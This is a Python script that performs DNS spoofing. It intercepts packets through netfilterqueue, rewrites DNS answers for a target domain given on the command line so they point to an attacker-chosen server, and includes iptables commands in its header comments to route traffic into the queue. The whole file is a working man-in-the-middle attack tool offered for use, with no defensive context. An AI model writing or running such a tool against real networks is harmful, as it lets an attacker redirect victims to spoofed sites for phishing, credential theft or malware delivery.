#!/usr/bin/env python

# iptables - I INPUT - j NFQUEUE - -queue-num 0
# iptables - I OUTPUT - j NFQUEUE - -queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

import netfilterqueue
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target',
                        help='Target domain name to spoof ex.(www.test.com)')
    parser.add_argument('-s', '--server', dest='spoof_server',
                        help='Webserver address to redirect to ex.(10.0.2.1)')
    options = parser.parse_args()
    if not options.target:
        # code to handle error
        parser.error(
            '[-] Please specify an Target Domain, use --help for more information.')
    elif not options.spoof_server:
        # code to handle error
        parser.error(
            '[-] Please specify a webserver address to redirect requests to, use --help for more information.')
    return options


def modify_packet(packet, scapy_packet, target, spoof_server):
    if scapy_packet.haslayer(scapy.DNSRR):

        # modify the packet
        qname = scapy_packet[scapy.DNSQR].qname
        if target in qname:
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata=spoof_server)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # deleting the values that will be recalculated by scapy
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

        # print(scapy_packet.show())


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    modify_packet(packet, scapy_packet, options.target, options.spoof_server)
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
options = get_arguments()
queue.bind(0, process_packet)
queue.run()
